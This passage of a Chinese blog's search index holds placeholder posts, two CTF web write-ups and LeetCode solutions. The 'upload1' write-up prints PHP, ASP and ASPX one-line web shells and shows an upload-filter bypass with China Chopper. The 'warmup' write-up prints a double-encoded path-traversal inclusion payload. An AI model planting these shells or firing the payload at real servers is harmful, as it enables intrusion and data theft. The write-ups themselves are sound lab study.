    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇PWN分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
  </entry>
  <entry>
    <title>test_REVERSE</title>
    <url>/2020/10/11/test-REVERSE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇REVERSE分类的测试文章</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REVERSE</category>
      </categories>
  </entry>
  <entry>
    <title>test_WEB</title>
    <url>/2020/10/11/test-WEB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这只是一篇WEB分类的测试文章</p>
<p>aplayer测试：</p>

    <div id="aplayer-nlHnSdHG" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="001xLIXo2w9V7U" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
<p>dplayer测试：</p>
<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"hotkey":true,"preload":"metadata","video":{"url":"http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script> 
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>test_acm</title>
    <url>/2020/10/11/test-acm/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是ACM分类的测试文章</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
  </entry>
  <entry>
    <title>test_schedule</title>
    <url>/2020/10/11/test-schedule/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
  </entry>
  <entry>
    <title>upoload1</title>
    <url>/2020/10/23/upoload1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4822&amp;page=1">题目地址</a></p>
<p><strong>题目名称</strong>：upload1</p>
<p><strong>题目描述：</strong>暂无</p>
<a id="more"></a>
<h5 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a>WriteUp:</h5><h6 id="上传一句话木马"><a href="#上传一句话木马" class="headerlink" title="上传一句话木马"></a><strong>上传一句话木马</strong></h6><p>看题目名称应该就知道是文件上传了，创建场景，点击链接页面如下：</p>
<p><img src="/2020/10/23/upoload1/image-20201023164335571.png" alt="image-20201023164335571"></p>
<p>先选择一个php后缀文件上传，提示要上传图片</p>
<p><img src="/2020/10/23/upoload1/image-20201023164418341.png" alt="image-20201023164418341"></p>
<p>上传一张jpg后缀图片上传，没有反应应该是上传成功了，新建一个文本文件，内容为php一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>把文件后缀改成jpg格式，选择文件然后点击上传并用burpsuite工具抓包（浏览器需开代理）</p>
<p><img src="/2020/10/23/upoload1/image-20201023164914678.png" alt="image-20201023164914678"></p>
<p>然后把文件名.jpg后缀去掉，发送请求，可以看到一句话木马上传成功，存储路径为：upload/1603442923.upload.php</p>
<p><img src="/2020/10/23/upoload1/image-20201023165129136.png" alt="image-20201023165129136"></p>
<h6 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h6><p>打开“中国菜刀”工具，添加url，配置如下：</p>
<p><img src="/2020/10/23/upoload1/image-20201023165654178.png" alt="image-20201023165654178"></p>
<p>双击这个url就可以连接到服务器了，可以看到我们上传的内容，其中就有我们的一句话木马文件（我这里是上传过很多次）</p>
<p><img src="/2020/10/23/upoload1/image-20201023165810390.png" alt="image-20201023165810390"></p>
<p>当前目录的上级目录就包含flag.php文件，打开后得到flag</p>
<p><img src="/2020/10/23/upoload1/image-20201023165924077.png" alt="image-20201023165924077"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;cyberpeace&#123;5bcd10d9509d29e1df1ff237b06e51e4&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>开始上传php后缀文件失败，提示上传一张图片，而把php文件中的内容不变只加了个jpg后缀就上传成功了，是因为上传文件的判断是在前端进行的，只检测了上传文件的后缀，并没有对文件真正的格式进行校验，所以使用burpsuite代理就可以轻松绕过前端校验。</p>
<p>以前做java后台开发的时候还在疑惑前端已经校验了表单传过来的数据，后端还要再校验一次吗？？？现在就很清楚了，只要是前端校验的东西都可以通过代理绕过。</p>
<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h5><p><strong>中国菜刀：</strong></p>
<p>中国菜刀，是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在主视图中右键/添加，在弹出的对话框中输入服务端地址，连接的密码(请注意上例中的pass字串)，选择正确的脚本类型和语言编码，保存后即可使用文件管理，虚拟终端，数据库管理三大块功能。</p>
<p><strong>一句话木马：</strong></p>
<ul>
<li><p>“一句话木马”服务端（是用于本地的html提交脚本木马文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改</p>
</li>
<li><p>“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 &lt;%execute(request(“value”))%&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp一句话木马：</span><br><span class="line">	&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line">php一句话木马：</span><br><span class="line">	&lt;?php @eval($_POST[value]);?&gt;</span><br><span class="line">aspx一句话木马：</span><br><span class="line">	&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">	&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>warmup</title>
    <url>/2020/10/17/warmup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5442&amp;page=1">题目地址</a></p>
<p>题目名称：warmup</p>
<p>题目描述：暂无</p>
<p>题目附件：暂无</p>
<a id="more"></a>
<p><strong>题外话：</strong></p>
<p>这两天做RSA题没做出来，看WriteUp发现RSA的原理自己还不太懂，题解也不太懂，好菜啊难受，，还是需要很多数学公式的，头都大了，先放一放吧，先做一道web放松一下。</p>
<p>WriteUp:</p>
<p>创建场景访问后的页面如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017191236773.png" alt="image-20201017191236773"></p>
<p>啥也没有，只有一个大表情，查看源码，提示\<!--source.php--></p>
<p><img src="/2020/10/17/warmup/image-20201017191619814.png" alt="image-20201017191619814"></p>
<p>source.php源码页面分析如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">#函数对文件进行语法高亮显示。</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">#必须传参$page,且参数是字符串，否则返回false</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">#如果参数在白名单里面 返回true</span></span><br><span class="line">			</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(<span class="comment">#截取参数第一个？之前的字符串返回，</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);<span class="comment">#对参数进行url解码</span></span><br><span class="line">            $_page = mb_substr(<span class="comment">#解码后截取第一个？之前的字符串返回</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;<span class="comment">#如果在白名单里返回True</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;<span class="comment">#返回false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#php类并不会执行（除非调用），从这开始执行</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">	<span class="comment">#判断为真的条件，file参数非空；file参数是字符串；checkFile返回结果为True</span></span><br><span class="line">	<span class="comment">#返回file参数的文件源码</span></span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];<span class="comment">#把包含的文件读取进来</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到还有一个hint.php，查看内容如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017193107533.png" alt="image-20201017193107533"></p>
<p>根据猜测flag在得到了一个ffffllllaaaagggg文件中，source.php源码中有include语句。所以要把ffffllllaaaagggg文件的路径传入file参数中。</p>
<p>在本地使用wamp集成服务器组件搭建了一个php环境，一通测试分析之后如下：</p>
<ul>
<li><p>在地址栏需要file传参</p>
</li>
<li><p>file参数值经过checkFile函数返回值要为true</p>
</li>
<li>file参数值还要是ffffllllaaaagggg文件的路径</li>
</ul>
<p>根据checkfile函数构造payload为：</p>
<p><code>?file=source.php%253f/../../../../ffffllllaaaagggg</code></p>
<p>因为%253f是’?’字符两次url编码后的值</p>
<p>因为url有一次自动url解码，第一次mb_substr时无变化，然后通过urldecode函数变成了?file=source.php?/../../../../ffffllllaaaagggg,然后截取?之前的参数正好是source.php结果返回true，而正好构造的payload是ffffllllaaaagggg的路径，../的个数是逐次添加尝试得到的结果，如下：</p>
<p><img src="/2020/10/17/warmup/image-20201017195308183.png" alt="image-20201017195308183"></p>
<p><strong>原理：</strong></p>
<p>include语句会包含url自动解码后的source.php%3f/../../../../ffffllllaaaagggg，而会从php根目录source.php%3f文件开始一个../是一个上级目录，最后访问到ffffllllaaaagggg文件</p>
<p><strong>另外：</strong></p>
<p>下面这两个payload也可以访问，不知道为什么？</p>
<p><code>?file=source.php?../../../../../ffffllllaaaagggg</code></p>
<p><code>?file=source.php?/../../../../ffffllllaaaagggg</code></p>
<p>我再本地测试”source.php?/../“这样写的的话是不能访问上级目录的，好像不会把source.php?当成一个文件名，?会当成传参符号，也不知道为什么可以访问到，也不纠结了😬</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>一维数组的动态和</title>
    <url>/2020/11/06/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/running-sum-of-1d-array/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>一维数组的动态和</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code> 。数组「动态和」的计算公式为：<code>runningSum[i] = sum(nums[0]…nums[i])</code> 。</p>
<p>请返回 <code>nums</code> 的动态和。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4]</span><br><span class="line">输出：[1,3,6,10]</span><br><span class="line">解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,1,1,1]</span><br><span class="line">输出：[1,2,3,4,5]</span><br><span class="line">解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [3,1,2,10,1]</span><br><span class="line">输出：[3,4,6,16,17]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>-10^6 &lt;= nums[i] &lt;= 10^6</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组，依次累加</p>
<p><strong>c++代码：</strong>（执行0ms，击败100%，内存8.6M，击败21.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">runningSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            nums[i]+=nums[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>也是非常简单的一道题了，不过内存消耗怎么才击败21.53%，我这应该是最优解了吧，难道是剩下没击败的都和我是平局😅，不知道LeetCode平台怎么计算的</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>上升下降字符串</title>
    <url>/2020/11/17/%E4%B8%8A%E5%8D%87%E4%B8%8B%E9%99%8D%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/increasing-decreasing-string/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code> ，请你根据下面的算法重新构造字符串：</p>
<ol>
<li>从 <code>s</code> 中选出 <strong>最小</strong> 的字符，将它 <strong>接在</strong> 结果字符串的后面。</li>
<li>从 <code>s</code> 剩余字符中选出 <strong>最小</strong> 的字符，且该字符比上一个添加的字符大，将它 接在 结果字符串后面。</li>
<li>重复步骤 2 ，直到你没法从 <code>s</code> 中选择字符。</li>
<li>从 <code>s</code> 中选出 <strong>最大</strong> 的字符，将它 <strong>接在</strong> 结果字符串的后面。</li>
<li>从 <code>s</code> 剩余字符中选出 <strong>最大</strong> 的字符，且该字符比上一个添加的字符小，将它 接在 结果字符串后面。</li>
<li>重复步骤 5 ，直到你没法从 <code>s</code> 中选择字符。</li>
<li>重复步骤 1 到 6 ，直到 <code>s</code> 中所有字符都已经被选过。</li>
</ol>
<p>在任何一步中，如果最小或者最大字符不止一个 ，你可以选择其中任意一个，并将其添加到结果字符串。</p>
<p>请你返回将 <code>s</code> 中字符重新排序后的 <strong>结果字符串</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aaaabbbbcccc&quot;</span><br><span class="line">输出：&quot;abccbaabccba&quot;</span><br><span class="line">解释：第一轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abc&quot;</span><br><span class="line">第一轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccba&quot;</span><br><span class="line">第一轮结束，现在 s &#x3D; &quot;aabbcc&quot; ，我们再次回到步骤 1</span><br><span class="line">第二轮的步骤 1，2，3 后，结果字符串为 result &#x3D; &quot;abccbaabc&quot;</span><br><span class="line">第二轮的步骤 4，5，6 后，结果字符串为 result &#x3D; &quot;abccbaabccba&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;rat&quot;</span><br><span class="line">输出：&quot;art&quot;</span><br><span class="line">解释：单词 &quot;rat&quot; 在上述算法重排序以后变成 &quot;art&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;leetcode&quot;</span><br><span class="line">输出：&quot;cdelotee&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ggggggg&quot;</span><br><span class="line">输出：&quot;ggggggg&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;spo&quot;</span><br><span class="line">输出：&quot;ops&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 500</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>一开始尝试使用暴力模拟，先给字符串字符sort非递减排序。第一轮正向遍历求出一串升序字符串，反向遍历求出一串降序字符串然后循环直到所有字符都已被选过。运行超出时间限制了，意料之中遍历太慢了。</p>
<p>重新思考，注意到提示中s只包含小写英文字母，想到了从没用过的计数法，使用大小为26的数组存储字符串中字符出现的个数，然后正向将出现的字母依次放入结果字符串中，放入字母后，该字母的数量应该减1，然后再反向遍历放入字母，直到数组中元素的值为0即所有字符都已被选过。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败56.24%，内存消耗7.9M，击败26.54%）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    string sortString(string s) &#123;</span><br><span class="line">        &#x2F;&#x2F;计数法</span><br><span class="line">        string result&#x3D;&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;因为s只包含小写英文字母,用数组存储每个字母的个数</span><br><span class="line">        vector&lt;int&gt; num(26,0);</span><br><span class="line">        int i;</span><br><span class="line">        for(i&#x3D;0;i&lt;s.length();++i)&#123;</span><br><span class="line">            ++num[s[i]-&#39;a&#39;];</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;数组num中元素最大值大于零就表示还有字符没有选过</span><br><span class="line">        while(*max_element(num.begin(),num.end())&gt;0)&#123;</span><br><span class="line">            &#x2F;&#x2F;从前往后遍历，选出最小字符</span><br><span class="line">            for(i&#x3D;0;i&lt;26;++i)&#123;</span><br><span class="line">                if(num[i]!&#x3D;0)&#123;</span><br><span class="line">                    result+&#x3D;i+&#39;a&#39;;</span><br><span class="line">                    &#x2F;&#x2F;当前字符数量减一</span><br><span class="line">                    --num[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;从后往前遍历，选出最大字符</span><br><span class="line">            for(i&#x3D;25;i&gt;&#x3D;0;--i)&#123;</span><br><span class="line">                if(num[i]!&#x3D;0)&#123;</span><br><span class="line">                    result+&#x3D;i+&#39;a&#39;;</span><br><span class="line">                    --num[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/increasing-decreasing-string/solution/shang-sheng-xia-jiang-zi-fu-chuan-by-leetcode-solu/">官方题解</a>:</h6><p><strong>方法一：桶记数</strong></p>
<p><strong>思路</strong></p>
<p>我们可以开一个长度为 26 的数组表示 26 个桶，每个桶里存放一种字母。先用 $O(|s|)$ 的时间扫描一遍字符串（其中 $|s|$代表字符串的长度），统计每个字母出现的次数。然后我们只要不停地扫描这里的「桶序列」——先从小到大扫，再从大到小扫，每次发现一个桶当中计数值不为 0 的时候，就把这个桶对应的字母添加到结果字符串的最后方，然后对计数值减一。</p>
<p>具体地，开一个长度为 26 的数组 <code>h[]</code>，作为用来计数的「桶」。<code>haveChar</code> 的功能是在每次循环开始执行之前判断是否还有未使用的字符。<code>appendChar</code> 的功能是检测当前位置的桶是否计数值为 0，如果不为 0 则修改目标串和计数值。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7.8M，击败28.96%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> h[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">haveChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">sortString</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;c: s) ++h[c - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> appendChar = [&amp;] (<span class="keyword">int</span> p) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h[p]) &#123;</span><br><span class="line">                --h[p];</span><br><span class="line">                ret.push_back(p + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!haveChar()) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) appendChar(i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; --i) appendChar(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：考虑最坏情况下字符串 $s$ 中 $|s|$ 个字符全部是同一个字母，最外层的 <code>while</code> 循环就要执行 $\lceil \frac{|s|}{2} \rceil$ 次（其中 $\lceil x \rceil$表示 $x$向上取整），每次执行中又包含 3 个执行 26 次的循环，故这里的渐进时间复杂度为 $O(3 \times 26 \times |s|) = O(|s|)$。</li>
<li>空间复杂度：这里使用了长度为 26 的数组作为辅助空间，故渐进空间复杂度为 $O(26)$。</li>
</ul>
